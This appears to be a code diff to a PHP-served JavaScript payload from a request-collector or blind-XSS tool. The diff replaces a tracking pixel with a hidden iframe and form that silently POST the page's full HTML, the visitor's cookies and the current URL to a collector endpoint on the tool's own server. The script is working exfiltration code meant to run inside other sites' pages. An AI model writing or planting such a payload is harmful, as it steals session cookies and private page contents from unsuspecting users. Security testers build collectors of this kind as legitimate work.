@@ -17,11 +17,48 @@ update_access_log();
 header('Content-Type: application/javascript');
 ?>
 (function() {
-  var img = document.createElement("img");
+  // mostly copied from https://stackoverflow.com/questions/298745/
+  var form = document.createElement("form");
+  var iframe = document.createElement("iframe");
+  var uniqueString = "collector-form";
 
-  img.src = "<?= domain_with_scheme(); ?>/file.php?" +
-    "secret=<?= SECRET; ?>&file=pixel.png&extra[headers][0][key]=" +
-    "Content-Type&extra[headers][0][value]=image/png";
+  // append hidden iframe to POST to for our collector form
+  document.head.appendChild(iframe);
+  iframe.style.display = "none";
+  iframe.contentWindow.name = uniqueString;
 
-  document.body.appendChild(img);
+  // construct a form with hidden inputs, targeting the iframe
+  var form = document.createElement("form");
+  form.target = uniqueString;
+  form.action = "<?= domain_with_scheme(); ?>/ping.php?" +
+    "secret=<?= SECRET; ?>&body=%20";
+  form.method = "POST";
+
+  // capture document body in POST parameter to avoid URL
+  // too long exception
+  var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "html";
+  input.value = document.documentElement.innerHTML;
+  form.appendChild(input);
+
+  // capture document cookies in POST parameter to avoid URL
+  // too long exception
+  var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "cookies";
+  input.value = document.cookie;
+  form.appendChild(input);
+
+  // capture window in POST parameter to avoid URL
+  // too long exception
+  var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "window";
+  input.value = window.location.href;
+  form.appendChild(input);
+
+  // append form to document and submit form
+  document.head.appendChild(form);
+  form.submit();
 })();
